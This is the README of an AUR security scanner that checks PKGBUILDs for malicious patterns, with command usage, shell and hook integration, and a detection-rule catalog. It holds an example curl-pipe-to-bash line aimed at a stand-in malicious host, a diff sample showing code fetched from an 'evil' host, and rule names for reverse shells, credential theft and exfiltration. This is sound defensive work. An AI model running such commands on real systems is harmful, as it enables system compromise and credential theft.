# AUR Security Scanner

```
║ ║╔═╝  ╔═║║ ║╔═║  ╔═╝╔═╝╔═║╔═ ╔═ ╔═╝╔═║
╔╝ ══║═╝╔═║║ ║╔╔╝═╝══║║  ╔═║║ ║║ ║╔═╝╔╔╝
╝ ╝══╝  ╝ ╝══╝╝ ╝  ══╝══╝╝ ╝╝ ╝╝ ╝══╝╝ ╝
```

**Detect malicious AUR packages before they compromise your system.**

[![AUR version](https://img.shields.io/aur/version/aur-scanner?logo=archlinux&logoColor=white&label=AUR)](https://aur.archlinux.org/packages/aur-scanner)
[![License: GPL-3.0](https://img.shields.io/badge/license-GPL--3.0-blue.svg)](LICENSE)
[![Built with Rust](https://img.shields.io/badge/built_with-Rust-dea584?logo=rust&logoColor=white)](https://www.rust-lang.org)
[![GPG-signed releases](https://img.shields.io/badge/releases-GPG_signed-2ea44f?logo=gnuprivacyguard&logoColor=white)](https://github.com/KiefStudioMA/ks-aur-scanner/releases)
[![Static analysis only](https://img.shields.io/badge/scanner-static_only-2ea44f.svg)](#security)
[![PRs welcome](https://img.shields.io/badge/PRs-welcome-2ea44f.svg)](CONTRIBUTING.md)
[![Code of Conduct](https://img.shields.io/badge/code_of_conduct-v2.1-blueviolet.svg)](CODE_OF_CONDUCT.md)

A comprehensive security scanner for Arch Linux AUR packages that analyzes PKGBUILDs and install scripts for malicious patterns, suspicious behavior, and security vulnerabilities. Written in Rust for performance and safety.

**Built and maintained by [Kief Studio](https://kief.studio)** — [@HxHippy](https://github.com/HxHippy) is the maintainer and the review gate for every change ([CODEOWNERS](.github/CODEOWNERS)). Outside contributors propose from forks and have no write access; their work is credited in [Contributors](#contributors). GitHub's sidebar lists commit authors, not the team.

---

## TL;DR

```bash
# Install (stable, GPG-signed release — see "From AUR" for all channels)
paru -S aur-scanner
# or
yay -S aur-scanner

# Scan a package before installing
aur-scan check <package-name>

# Scan a local PKGBUILD
aur-scan scan ./PKGBUILD

# Scan all installed AUR packages
aur-scan system
```

---

## Table of Contents

- [Why This Exists](#why-this-exists)
- [Features](#features)
- [Installation](#installation)
  - [From AUR](#from-aur)
  - [From Source](#from-source)
  - [Manual Installation](#manual-installation)
- [Quick Start](#quick-start)
- [Command Reference](#command-reference)
  - [aur-scan check](#aur-scan-check)
  - [aur-scan install (race-free)](#aur-scan-install-race-free)
  - [aur-scan scan](#aur-scan-scan)
  - [aur-scan system](#aur-scan-system)
  - [aur-scan diff](#aur-scan-diff)
  - [aur-scan ioc](#aur-scan-ioc)
  - [aur-scan codes](#aur-scan-codes)
  - [aur-scan explain](#aur-scan-explain)
  - [aur-scan completions](#aur-scan-completions)
  - [Custom & Community Rules](#custom--community-rules)
- [Integration Options](#integration-options)
  - [Level 1: Manual CLI](#level-1-manual-cli)
  - [Level 2: Shell Integration](#level-2-shell-integration-recommended)
  - [Level 3: Wrapper Binary](#level-3-wrapper-binary)
  - [Level 4: Pacman Hook](#level-4-pacman-hook)
- [Detection Rules Reference](#detection-rules-reference)
  - [Critical Severity](#critical-severity)
  - [High Severity](#high-severity)
  - [Medium Severity](#medium-severity)
  - [Low Severity](#low-severity)
  - [Info Severity](#info-severity)
- [Change Detection](#change-detection)
- [Name Impersonation](#name-impersonation)
- [Output Formats](#output-formats)
- [Configuration](#configuration)
- [Real-World Detection Examples](#real-world-detection-examples)
- [Project Architecture](#project-architecture)
- [Dependencies](#dependencies)
- [Building from Source](#building-from-source)
- [Testing](#testing)
- [License](#license)
- [Contributing](#contributing)
- [Security](#security)
- [Credits](#credits)
- [Disclaimer](#disclaimer)

---

## Why This Exists

The Arch User Repository (AUR) is an incredible community resource that extends Arch Linux with thousands of user-contributed packages. However, AUR packages are inherently untrusted and have been exploited multiple times:

| Date | Attack | Impact |
|------|--------|--------|
| **June 2026** | "Atomic Arch" — orphaned packages adopted and modified to pull malicious npm/bun packages (`atomic-lockfile`, `js-digest`) from install hooks ([Arch Linux news](https://archlinux.org/news/active-aur-malicious-packages-incident/)) | Reported credential stealer + eBPF rootkit (`scales.bpf.c`) |
| **July 2025** | CHAOS RAT distributed via `firefox-patch-bin` and `librewolf-fix-bin` | Remote access trojan with persistence via systemd masquerading |
| **2018** | Orphaned packages `acroread`, `balz`, `minergate` hijacked | Cryptominer installation via `curl \| bash` and systemd timers |
| **Ongoing** | Typosquatting attacks mimicking popular package names | Various malware payloads |

**An AUR payload runs when `makepkg` builds the package, so the scan has to happen before the build. That is where this scanner sits: in front of your AUR helper, on the exact files about to be built.**

This scanner implements detection rules based on real-world attacks and security research, providing an additional layer of defense for the Arch Linux ecosystem.

---

## Features

| Feature | Description |
|---------|-------------|
| **Static Analysis** | 138 detection codes across pattern rules and dedicated analyzers, in one auditable catalog |
| **Install Script Scanning** | Analyzes `.install` scripts for persistence mechanisms |
| **Source Verification** | Validates URLs, checksums, and download sources |
| **AUR Integration** | Fetch and scan packages directly from AUR before installation |
| **System Audit** | Scan all installed AUR packages in a single command |
| **Threat Intelligence** _(opt-in)_ | Optional VirusTotal hash & URLhaus URL reputation checks — **off by default**, bring-your-own-key, public hashes/URLs only |
| **Multiple Output Formats** | Human-readable, JSON, and SARIF for CI/CD integration |
| **Shell Integration** | Seamless wrapper for yay, paru, and other AUR helpers |
| **Pacman Hook** _(backstop)_ | Opt-in check during the pacman transaction; runs after the build, so it catches `.install` scriptlets, not build-time payloads |
| **Offline Operation** | Core scanning works without network access |
| **Small Runtime Footprint** | One binary per tool; runtime needs only `gcc-libs` and `openssl` from the Arch repos |

---

## Installation

### From AUR

All four packages install the same `aur-scan` binary and **conflict with each
other — install exactly one**. Pick the channel that fits you:

| Package | Channel | Builds from | Best for |
|---------|---------|-------------|----------|
| [`aur-scanner`](https://aur.archlinux.org/packages/aur-scanner) | **Stable** (recommended) | GPG-signed release tag | Most users and production systems |
| [`ks-aur-scanner`](https://aur.archlinux.org/packages/ks-aur-scanner) | Stable (alias) | GPG-signed release tag | Same as `aur-scanner`, under an alternate name |
| [`aur-scanner-rc`](https://aur.archlinux.org/packages/aur-scanner-rc) | Release candidate | GPG-signed pre-release tag | Testing the next release before it ships |
| [`aur-scanner-git`](https://aur.archlinux.org/packages/aur-scanner-git) | Rolling | Latest commit on `main` | Bleeding edge and contributors |

```bash
paru -S aur-scanner        # stable, recommended — or: yay -S aur-scanner
```

The tagged packages (`aur-scanner`, `ks-aur-scanner`, `aur-scanner-rc`) build
from a **GPG-signed git tag** and verify it against our signing key
(`validpgpkeys`), so `makepkg` refuses to build a tag that isn't signed by us —
integrity comes from the signature, not a tarball hash. If your AUR helper does
not fetch the key automatically, import it once:

```bash
gpg --recv-keys 25631EAE3F43999050B7D7021132BF893C33FB51
```

> **Release-candidate channel — [`aur-scanner-rc`](https://aur.archlinux.org/packages/aur-scanner-rc):**
> tracks the next release before it is promoted to stable — currently
> **`v2.2.0-rc.2`**: change detection, name impersonation, ownership signals and
> static binary analysis. That is a large surface change (118 → 138 detection
> codes) and wants soak time, which is what this channel is for. The RC **fails
> closed**
> (the wrapper/hook deny on a scan error, timeout, or no-TTY prompt rather than
> proceeding). Most users — and all production systems — should install the
> stable `aur-scanner`.

### From Source

```bash
git clone https://github.com/KiefStudioMA/ks-aur-scanner.git
cd ks-aur-scanner
cargo build --release
```

### Manual Installation

After building from source:

```bash
# Install binaries
sudo install -Dm755 target/release/aur-scan /usr/bin/aur-scan
sudo install -Dm755 target/release/aur-scan-wrap /usr/bin/aur-scan-wrap
sudo install -Dm755 target/release/aur-scan-hook /usr/bin/aur-scan-hook

# Install shell integration (recommended — scans BEFORE makepkg builds)
sudo install -Dm644 install/integration.bash /usr/share/aur-scan/integration.bash
sudo install -Dm644 install/integration.zsh /usr/share/aur-scan/integration.zsh
sudo install -Dm644 install/integration.fish /usr/share/aur-scan/integration.fish
sudo install -Dm644 install/integration.nu /usr/share/aur-scan/integration.nu

# Install the community rules example
sudo install -Dm644 install/rules.d/example.toml /usr/share/aur-scanner/rules.d/example.toml

# Pacman hook — opt-in backstop only. It runs AFTER makepkg has already built
# (and executed) the package, so it catches .install scriptlets, not build-time
# payloads. Prefer the shell integration above. Enable it deliberately:
sudo install -Dm644 install/aur-scan.hook /etc/pacman.d/hooks/aur-scan.hook
```

---

## Quick Start

```bash
# Check a package BEFORE installing from AUR
aur-scan check firefox-patch-bin

# Scan a local PKGBUILD file
aur-scan scan ./PKGBUILD

# Scan an entire package directory
aur-scan scan ./my-package/

# Audit all installed AUR packages on your system
aur-scan system

# Learn about a specific detection code
aur-scan explain DLE-001

# List all detection codes
aur-scan codes
```

---

## Command Reference

### aur-scan check

Resolve the **full AUR dependency tree**, scan every untrusted package in it,
and emit a reviewable **SBOM** — all *before* anything is built or installed.
`paru -S foo` builds foo's entire AUR dependency closure, and a hijacked
package is often a *dependency*, so the named package alone is not enough.

```bash
aur-scan check <package-name>... [OPTIONS]

OPTIONS:
    --no-deps            Scan only the named packages, not their AUR dep tree
    --include-optional   Also follow optdepends when resolving the tree
    --sbom <FILE>        Write a CycloneDX 1.5 SBOM of the whole tree to FILE
    --local <DIR>        Scan an already-fetched package dir from disk (repeatable)
    --fail-on <LEVEL>    Gate: findings at this level or above fail the run
                         (critical, high, medium, low, info)
    --no-confirm         Don't prompt (for wrappers/CI); still gates, on
                         Critical unless --fail-on says otherwise
```

**Gate and prompt.** With `--no-confirm` the run fails at `--fail-on` (default
Critical). Interactively, a tripped gate (default High) asks before passing;
that question needs a real terminal, so piped or redirected input is a denial,
never a yes. Packages that could not be fully analyzed (`SCAN-001`), fetched, or
resolved are never offered a prompt: they fail the run.

**Race-free (TOCTOU-safe) workflow.** By default `check` fetches its own copy of
each PKGBUILD; the helper then re-clones and builds its own copy, so the bytes
scanned aren't provably the bytes built. To scan the *exact* bytes that will be
built, fetch once and scan that directory with `--local`, then build from it:

```bash
paru -G mypkg                          # download PKGBUILD only, no build
aur-scan check --local mypkg --fail-on critical   # scan those exact bytes
makepkg -D mypkg -si                   # build the same, reviewed directory
```

`--local` directories are scanned from disk and marked `(local)`; any remaining
AUR dependencies are resolved/fetched normally (provide their dirs too for a
fully race-free tree).

The dependency tree is printed for review, marking each node `[AUR]` (scanned)
or `[repo]` (official, trusted), flagging orphaned AUR packages, and annotating
findings per node (`!! 2C/1H`). AUR packages are resolved recursively.

A dependency counts as `[repo]` only when **pacman** says a sync repository
satisfies it (provides and version constraints included). A name that only an
AUR package `provides` (common for `-git`/`-bin`) is resolved through the AUR
and every provider is scanned. Anything neither can satisfy is shown
`[UNRESOLVED]` and fails the run, as does a tree cut short by the depth or size
cap: an unscanned package is never reported as clean. Version constraints the
AUR version doesn't meet are printed as notes. `timeout_seconds` bounds each
package's fetch and scan; a timeout fails closed.

**Examples:**

```bash
# Resolve + scan the full tree and review it before installing
aur-scan check librewolf-bin

# Produce a CycloneDX SBOM to archive or review
aur-scan check ungoogled-chromium-bin --sbom chromium.cdx.json

# CI gate: fail on any high+ finding anywhere in the tree
aur-scan check my-package --no-confirm --fail-on high

# Just the named package, skip the dependency closure
aur-scan check some-tool --no-deps
```

> The dependency tree and SBOM are produced from the AUR RPC + PKGBUILDs
> **before** `makepkg` runs, which is the only point at which AUR build-time
> payloads can be caught. Drive it automatically by sourcing the shell
> integration so `paru`/`yay` call `aur-scan check` before every install.

### aur-scan install (race-free)

Resolve the tree, fetch every AUR package **once** into a workspace, scan those
exact directories, and — only if the scan gate passes — build them in
dependency order with `makepkg`, **from the same directories that were
scanned**. There is no second fetch between scanning and building, and every
scanned file is hashed again immediately before `makepkg` runs; any change
aborts the build.

What this does **not** cover: `makepkg` itself still downloads `source=` files,
checks out VCS sources, and runs `pkgver()` after the scan. Pinned checksums
protect the downloads; `SKIP` checksums and unpinned VCS sources do not. Before
building, `install` lists every package that relies on those, so you can see
the part the scan could not reach.

```bash
aur-scan install <package>... [OPTIONS]

OPTIONS:
    --gate <LEVEL>       Findings at/above this severity block the build
                         [default: critical]
    --force              Build even if the gate trips (deliberate override)
    --noconfirm          Pass --noconfirm to makepkg, skip the build prompt
    --workspace <DIR>    Clone/build workspace (default ~/.cache/aur-scan/build)
    --sbom <FILE>        Write a CycloneDX SBOM of the tree
```

Dependency ordering comes from the resolved graph (deps built before
dependents, AUR dependencies installed `--asdeps`); `makepkg` itself does all
the building, so no PKGBUILD logic is reimplemented. Enable it as the default
for the shell integration with `export AUR_SCAN_MODE=install`.

It installs AUR packages only: a named package that lives in the official repos
is refused with a pointer to `pacman -S`, never silently skipped. Unresolved or
ambiguous dependencies and files that could not be analyzed (`SCAN-001`) block
the build even with `--force`. Declining the prompt, or running without a
terminal and without `--noconfirm`, exits non-zero.

> **Scope:** builds each AUR `pkgbase` with `makepkg -si` in dependency order.
> It does not (yet) cover paru-specific features like split-package selection or
> chroot builds; for those, use the Level 2 `gate` mode.

### aur-scan scan

Scan a local PKGBUILD file or directory.

```bash
aur-scan scan <PATH> [OPTIONS]

OPTIONS:
    --format <FORMAT>    Output format: text, json, sarif [default: text] (-f)
    --output <FILE>      Write output to a file instead of stdout (-o)
    --fail-on <LEVEL>    Exit with error if findings at this level or above
    --include-info       Include informational (Info-level) findings

ARGUMENTS:
    <PATH>               Path to PKGBUILD file or directory containing PKGBUILD
```

**Examples:**

```bash
# Scan a single PKGBUILD
aur-scan scan ./PKGBUILD

# Scan a package directory (looks for PKGBUILD and .install files)
aur-scan scan ~/builds/my-package/

# Output SARIF for GitHub Security tab integration
aur-scan scan ./PKGBUILD --format sarif > results.sarif
```

### aur-scan system

Audit all AUR packages currently installed on the system.

```bash
aur-scan system [OPTIONS]

OPTIONS:
    --rescan             Re-fetch PKGBUILDs from the AUR instead of using the local cache
    --cache-dir <DIR>    Custom cache directory for PKGBUILDs
    --fail-on <LEVEL>    Exit non-zero at this severity or above [default: critical]
```

Exit status is non-zero when a finding reaches `--fail-on`, an installed package
matches the IOC database, or a package could not be scanned. Packages that
failed are listed under **Errors** in the summary; packages with no cached
PKGBUILD are listed as skipped.

This command:
1. Queries pacman for foreign (non-repo) packages
2. Locates cached PKGBUILDs in AUR helper cache directories
3. Scans each package and reports findings

**Supported cache locations** (per-helper defaults; XDG `*_HOME` overrides are honored):
- `~/.cache/yay/` (yay)
- `~/.cache/paru/clone/` (paru)
- `~/.local/share/pikaur/aur_repos/` (pikaur)
- `~/.cache/aura/packages/` (aura)
- `~/.cache/pakku/` (pakku)
- `~/.cache/trizen/sources/` (trizen)
- `~/.cache/aurutils/sync/` (aurutils)
- `~/.config/rua/pkg/` (rua)
- `~/.cache/pat-aur/pkgbuild/aur/` (pat-aur)

`system` also cross-references your installed package names against the IOC
database (see below) and runs the provenance check (flagging any package that
*gained* risky behavior since the last scan).

### aur-scan diff

Compare two versions of a package and report what moved. Scans both sides and
separates findings that **appeared** from findings that were already there,
because those are not the same thing: a package that has always used a `SKIP`
checksum has not changed, and a package that just grew a `curl | sh` has.

```bash
# Review an update before you take it
aur-scan diff ./mytool-1.0 ./mytool-1.1

# CI gate -- trips only on NEWLY ADDED findings, never on pre-existing state
aur-scan diff ./old ./new --fail-on critical

# Machine-readable
aur-scan diff ./old ./new --format json
```

```
Comparing 1.0-1 -> 1.1-1 (mytool)

ADDED (4)
  + CRITICAL  DLE-001  Curl pipe to shell
  + CRITICAL  PERSIST-002  Systemd timer creation (install script)
  + CRITICAL  EXEC-REMOTE  Fetches and runs code from https://cdn.evil.example/x.sh
  + HIGH      FUNC-001  Network access in build function

STRUCTURAL CHANGES
  ~ gained an install script (runs as root)
  ~ now fetches from github.com/notrealauthor/mytool
  ~ no longer fetches from github.com/realauthor/mytool

1 finding(s) carried over unchanged
```

Structural changes are reported separately because a severity count hides them:
an install scriptlet appearing, or upstream moving to a different owner, may
produce no findings at all on the day it happens and is still the single most
important thing in the diff.

Source URLs are compared at `host/owner/repo`, so routine version bumps and new
release tarballs do **not** register as an upstream change — only upstream
itself moving does.

`diff` keeps no state, which makes it safe in a pipeline. For the same
comparison performed automatically against your own scan history, see
[Change Detection](#change-detection).

### aur-scan ioc

Show or query the local IOC (indicator-of-compromise) database — known-malicious
payload packages, file artifacts, C2 domains, and campaign metadata. The
database is embedded and can be extended from a feed (drop a file at
`/usr/share/aur-scanner/ioc.toml` or `~/.local/share/aur-scanner/ioc.toml`).

```bash
aur-scan ioc                 # show database stats + campaigns
aur-scan ioc --check <name>  # is this package/file/hash a known indicator?
```

### aur-scan codes

List all detection codes with their severity and description.

```bash
aur-scan codes [OPTIONS]

OPTIONS:
    --category <CAT>     Filter by category
    --format <FORMAT>    Output format: text, markdown, json (default: text)
```

**Example output** (grouped by category):

```
[Command Injection]
  DLE-001 [Critical] Curl pipe to shell
  DLE-002 [Critical] Wget pipe to shell
  DLE-003 [Critical] Curl output executed
...
```

### aur-scan explain

Get detailed information about a specific detection code.

```bash
aur-scan explain <CODE>
```

**Example:**

```bash
$ aur-scan explain DLE-001

DLE-001: Curl pipe to shell
===========================

Severity: CRITICAL
Category: Command Injection
CWE: CWE-94

Description:
  Downloading and executing remote scripts is extremely dangerous.
  Used in 2018 xeactor attack.

Recommendation:
  Download scripts first, review them, then execute

Example Pattern:
  curl https://malicious.com/script.sh | bash
```

---

### aur-scan completions

Generate a shell completion script. Packages install these automatically; this
is for source builds and for regenerating them.

```bash
aur-scan completions bash > /usr/share/bash-completion/completions/aur-scan
aur-scan completions zsh  > /usr/share/zsh/site-functions/_aur-scan
aur-scan completions fish > /usr/share/fish/vendor_completions.d/aur-scan.fish
```

Completions are generated from the command tree itself, so they cannot drift
from the real command surface. This subcommand deliberately does **not** read
your configuration file: a typo in `config.toml` is a hard error everywhere
else, and it must not be able to break your shell setup at package-install time.

---

## Integration Options

### Level 1: Manual CLI

Use `aur-scan` commands directly before installing packages. This provides full control but requires manual invocation.

```bash
# Check package first
aur-scan check some-package

# Review output, then install if safe
paru -S some-package
```

### Level 2: Shell Integration (Recommended)

Add automatic scanning to your shell by sourcing the integration script.

**For Bash** - Add to `~/.bashrc`:

```bash
source /usr/share/aur-scan/integration.bash
```

**For Zsh** - Add to `~/.zshrc`:

```bash
source /usr/share/aur-scan/integration.zsh
```

**For Fish** - Add to `~/.config/fish/config.fish`:

```fish
source /usr/share/aur-scan/integration.fish
```

**For Nushell** - Add to your `config.nu`:

```nu
source /usr/share/aur-scan/integration.nu
```

The bash/zsh/fish scripts classify the helper invocation in-shell; the Nushell
script routes installs through the `aur-scan-wrap` binary (same scan-then-handoff
gate), so it requires `aur-scan-wrap` on `PATH` (shipped with every package).

This creates wrapper functions for `paru` and `yay` that:
1. Detect AUR installs, upgrades, and local builds (`-B`, `-Ui`, `-U <dir>`)
2. Scan the full AUR dependency tree before anything builds
3. Prompt on findings at `AUR_SCAN_SEVERITY` (no terminal means no)
4. Refuse to run unscanned when `aur-scan` is missing or the upgrade query fails
5. Provide `paru-unsafe` and `yay-unsafe` functions to bypass scanning deliberately

**Example workflow:**

```bash
$ paru -S some-aur-package
AUR Security Scanner: Pre-checking packages...
============================================================
Checking: some-aur-package... OK
============================================================
Proceeding with installation...
```

### Level 3: Wrapper Binary

Use the standalone wrapper binary for explicit control:

```bash
# Direct usage
aur-scan-wrap paru -S package-name

# Or set up as an alias
alias paru='aur-scan-wrap paru'
alias yay='aur-scan-wrap yay'
```

The wrapper hands the decision to `aur-scan check` (or `aur-scan install` with
`AUR_SCAN_MODE=install`), so it gets the same dependency-tree scan and gate as
the shell integration:
- Installs (`-S`, `--sync`, `aur/name`) are scanned with their full AUR
  dependency tree; `core/name` and other repo prefixes pass
- Upgrades (`-Syu`, `-Sua`, bare `paru`/`yay`) scan the pending AUR updates
  from the helper's `-Quaq`; if that query fails, the upgrade is refused
- Local builds are scanned from disk: `-B <dir>`, `-Ui` (current directory),
  `-U <dir>`; installing an already built `*.pkg.tar.zst` passes with a notice
- An operand it cannot validate, or a missing `aur-scan`, blocks rather than
  passing through unscanned
- Honors `AUR_SCAN_SEVERITY` and the other `AUR_SCAN_*` settings
- Passes read-only operations through unchanged

### Level 4: Pacman Hook (backstop only — runs *after* the build)

> **Important timing caveat.** For an AUR package, `makepkg` runs the
> PKGBUILD's `prepare()`/`build()`/`package()` **before** the pacman
> transaction. A libalpm `PreTransaction` hook fires during that transaction —
> i.e. *after* the build has already executed. So this hook **cannot stop a
> build-time payload** (the most common AUR attack, including Atomic Arch) — by
> the time it fires, that code has already run. It still scans the full PKGBUILD,
> but it can only *prevent* payloads that haven't executed yet, in practice the
> package's `.install` scriptlet. **Use the shell integration (Level 2) as your
> real gate; treat this hook as a backstop.**

For a defense-in-depth backstop, install the pacman hook:

```bash
sudo install -Dm644 /usr/share/aur-scan/aur-scan.hook.example /etc/pacman.d/hooks/aur-scan.hook
```

**Hook behavior:**
- Triggers before the *install transaction* (after the build)
- Finds the invoking user through sudo, doas, pkexec, or the login uid, and
  looks in that user's helper caches (including paru `CloneDir` and yay
  `buildDir`); split packages are matched through `.SRCINFO`
- **Aborts the transaction on CRITICAL findings** (anywhere in the scanned PKGBUILD or its resolved `.install` scriptlet), and aborts fail-closed if a located PKGBUILD cannot be analyzed
- Warns on HIGH severity findings
- Warns, per package, when a foreign package has no PKGBUILD to scan or the
  cached PKGBUILD's version differs from the one being installed

**Strict mode.** By default an unscanned foreign package is a warning, because
aborting would break every `pacman -U` of a locally built package. Set
`AUR_SCAN_HOOK_STRICT=1` or create `/etc/aur-scanner/hook-strict` to abort the
transaction instead whenever a foreign package can't be scanned, its version
doesn't match, or no invoking user can be found.

**Hook configuration** (`/etc/pacman.d/hooks/aur-scan.hook`, the admin hook directory; `/usr/share/libalpm/hooks/` belongs to packages):

```ini
[Trigger]
Operation = Install
Operation = Upgrade
Type = Package
Target = *

[Action]
Description = Scanning AUR packages for security issues...
When = PreTransaction
Exec = /usr/bin/aur-scan-hook
AbortOnFail
NeedsTargets
```

---

## Detection Rules Reference

> The **140 built-in detection codes**, generated from the catalog
> (`aur-scan codes --format markdown`) — every ID is unique and audit-enforced.
> (`EXAMPLE-001` is the community-rule sample; `PERM-001`/`PERM-002` are real
> shipped community rules in the same directory, not built-ins.) Extend the
> catalog with your own TOML rules (see [Custom & Community Rules](#custom--community-rules)).

## CRITICAL severity

| Code | Name | Category | Detector | CWE |
|------|------|----------|----------|-----|
| `ATOMIC-001` | Atomic Arch malicious npm/bun package | Malicious Code | rules | CWE-506 |
| `ATOMIC-002` | Node/Bun package manager in install hook | Malicious Code | rules | CWE-494 |
| `ATOMIC-003` | eBPF rootkit / payload artifact | Persistence | rules | CWE-506 |
| `ATOMIC-004` | Sudo shim in user local bin | Malicious Code | rules | CWE-506 |
| `BIN-002` | Prebuilt binary executed during the build | Malicious Code | binary | CWE-506 |
| `BIN-003` | Prebuilt eBPF object | Malicious Code | binary | CWE-506 |
| `BROWSER-001` | Browser profile access | Credential Theft | rules | CWE-522 |
| `BROWSER-002` | Browser database access | Credential Theft | rules | CWE-522 |
| `CRED-001` | SSH key access | Credential Theft | rules | CWE-522 |
| `CRED-002` | GPG key access | Credential Theft | rules | CWE-522 |
| `CRED-003` | Password file access | Credential Theft | rules | CWE-522 |
| `CRED-005` | Keyring / wallet access | Credential Theft | rules | CWE-522 |
| `CRYPTO-001` | Mining pool connection | Cryptomining | rules | CWE-506 |
| `CRYPTO-002` | Cryptominer binary | Cryptomining | rules | CWE-506 |
| `CRYPTO-003` | Monero/Bitcoin wallet address | Cryptomining | rules | CWE-506 |
| `DEEP-001` | Decode-and-execute flow | Obfuscation | deep | CWE-506 |
| `DEEP-003` | Unicode bidirectional control characters | Obfuscation | deep | CWE-94 |
| `DLE-001` | Curl pipe to shell | Command Injection | rules | CWE-94 |
| `DLE-002` | Wget pipe to shell | Command Injection | rules | CWE-94 |
| `DLE-003` | Curl output executed | Command Injection | rules | CWE-94 |
| `ENV-001` | LD_PRELOAD manipulation | Malicious Code | rules | CWE-426 |
| `ENV-003` | Shell startup file modification | Persistence | rules | CWE-506 |
| `ESCAPE-001` | Extraction or copy outside the build root | Privilege Escalation | rules | CWE-22 |
| `EXEC-002` | Shell -c command substitution fetch | Malicious Code | rules | CWE-494 |
| `EXEC-REMOTE` | Fetches and runs external code | Malicious Code | remote_exec | CWE-494 |
| `EXFIL-001` | Curl POST data exfiltration | Data Exfiltration | rules | CWE-200 |
| `EXFIL-002` | Netcat data transfer | Data Exfiltration | rules | CWE-200 |
| `EXFIL-003` | Discord/Telegram webhook | Data Exfiltration | rules | CWE-506 |
| `EXFIL-004` | DNS exfiltration | Data Exfiltration | rules | CWE-200 |
| `EXFIL-008` | Slack/Teams webhook exfiltration | Data Exfiltration | rules | CWE-200 |
| `INSTALL-001` | Python execution in install script | Malicious Code | rules | CWE-94 |
| `INSTALL-003` | Network access in install script | Network Security | rules | CWE-494 |
| `INSTALL-004` | Language package manager invoked in install hook | Malicious Code | rules | CWE-494 |
| `IOC-001` | Known indicator-of-compromise match | Malicious Code | ioc | CWE-506 |
| `PASTE-001` | Pastebin download | Malicious Code | rules | CWE-506 |
| `PERSIST-001` | Systemd service creation in install | Persistence | rules | CWE-506 |
| `PERSIST-002` | Systemd timer creation | Persistence | rules | CWE-506 |
| `PERSIST-004` | rc.local modification | Persistence | rules | CWE-506 |
| `PERSIST-006` | Systemd masquerading | Persistence | rules | CWE-506 |
| `PRIV-001` | Sudo usage in a build function | Privilege Escalation | privilege | CWE-250 |
| `PRIV-002` | SUID/SGID bit set in a function | Privilege Escalation | privilege | CWE-732 |
| `PRIV-003` | Sudoers modification | Privilege Escalation | privilege | CWE-250 |
| `PRIV-007` | Privileged account manipulation | Privilege Escalation | rules | CWE-269 |
| `PRIV-008` | Password manipulation | Privilege Escalation | rules | CWE-269 |
| `SCAN-001` | Package file could not be analyzed | Configuration | scanner | CWE-693 |
| `SHELL-001` | Bash reverse shell | Malicious Code | rules | CWE-506 |
| `SHELL-002` | Netcat reverse shell | Malicious Code | rules | CWE-506 |
| `SHELL-003` | Python reverse shell | Malicious Code | rules | CWE-506 |
| `SHELL-004` | Socat shell | Malicious Code | rules | CWE-506 |
| `SHELL-005` | Perl reverse shell | Malicious Code | rules | CWE-94 |
| `SHELL-006` | PHP reverse shell | Malicious Code | rules | CWE-94 |
| `SHELL-007` | Ruby/Lua/AWK reverse shell | Malicious Code | rules | CWE-94 |
| `SHELL-008` | Node.js reverse shell | Malicious Code | rules | CWE-94 |
| `SHELL-009` | OpenSSL-encrypted reverse shell | Malicious Code | rules | CWE-94 |
| `SHELL-010` | Named-pipe (mkfifo) reverse shell | Malicious Code | rules | CWE-94 |
| `SHELL-011` | Busybox/telnet/ncat-ssl shell | Malicious Code | rules | CWE-94 |
| `SQUAT-001` | Package name imitates a trusted name | Malicious Code | squat | CWE-1007 |
| `SQUAT-004` | Package occupies an owned namespace under an unauthorised account | Malicious Code | squat | CWE-1007 |
| `TAMPER-001` | Auth database write | Privilege Escalation | rules | CWE-269 |
| `TAMPER-002` | doas/sudoers nopasswd grant | Privilege Escalation | rules | CWE-269 |
| `TAMPER-005` | PAM tampering | Privilege Escalation | rules | CWE-287 |
| `TAMPER-011` | pacman signature downgrade | Malicious Code | rules | CWE-347 |
| `TI-URLHAUS-001` | URLhaus lists a source URL | Malicious Code | threat_intel | CWE-494 |
| `TI-VT-001` | VirusTotal flags a source artifact | Malicious Code | threat_intel | CWE-506 |

## HIGH severity

| Code | Name | Category | Detector | CWE |
|------|------|----------|----------|-----|
| `BIN-001` | Prebuilt binary committed in the package directory | Suspicious Metadata | binary | CWE-494 |
| `BIN-004` | Binary searches for libraries in an unsafe location | Privilege Escalation | binary | CWE-426 |
| `CHK-001` | No checksums for sources | Cryptography | checksum | CWE-354 |
| `CHK-005` | All non-VCS sources use SKIP | Cryptography | checksum | CWE-354 |
| `CHK-006` | Checksum count mismatch | Configuration | checksum | - |
| `CRED-004` | Cloud / CI credential file access | Credential Theft | rules | CWE-522 |
| `CRED-008` | Environment/secret dump | Credential Theft | rules | CWE-522 |
| `DEEP-002` | Large embedded encoded blob | Obfuscation | deep | CWE-506 |
| `DEP-001` | Provides a core package name (dependency confusion) | Suspicious Metadata | metadata | CWE-427 |
| `DEP-003` | Package index/registry override | Dependencies | rules | CWE-494 |
| `DIFF-001` | New findings since the last scan | Suspicious Metadata | diff | - |
| `DIFF-002` | Package ownership changed | Suspicious Metadata | diff | - |
| `DIFF-003` | Package fetches from a new upstream | Network Security | diff | CWE-494 |
| `DIFF-004` | Install script added or changed | Persistence | diff | CWE-506 |
| `ENV-002` | PATH manipulation | Malicious Code | rules | CWE-426 |
| `EXEC-006` | sqlite3 shell-command execution | Malicious Code | rules | CWE-94 |
| `EXEC-007` | make reads a Makefile from stdin | Command Injection | rules | CWE-94 |
| `EXFIL-006` | HTTP upload exfiltration | Data Exfiltration | rules | CWE-200 |
| `EXFIL-007` | wget POST exfiltration | Data Exfiltration | rules | CWE-200 |
| `EXFIL-009` | Anonymous file-drop / tunnel host | Data Exfiltration | rules | CWE-200 |
| `FUNC-001` | Network access in a build function | Network Security | pattern | - |
| `HIDDEN-001` | Hidden file creation in home | Malicious Code | rules | - |
| `HIDDEN-002` | Tmp directory execution | Malicious Code | rules | - |
| `HIDDEN-003` | Binary in non-standard location | Malicious Code | rules | - |
| `INSTALL-002` | Binary execution in install script | Malicious Code | rules | CWE-94 |
| `META-003` | Replaces/conflicts a core or security package | Suspicious Metadata | metadata | CWE-1357 |
| `OBF-001` | Base64 decoding | Obfuscation | rules | CWE-506 |
| `OBF-002` | Eval usage | Command Injection | rules | CWE-95 |
| `OBF-003` | Hex-encoded payload | Obfuscation | rules | CWE-506 |
| `OBF-005` | Gzip decode execution | Obfuscation | rules | CWE-94 |
| `OBF-006` | Quote-splitting / character obfuscation | Obfuscation | rules | CWE-506 |
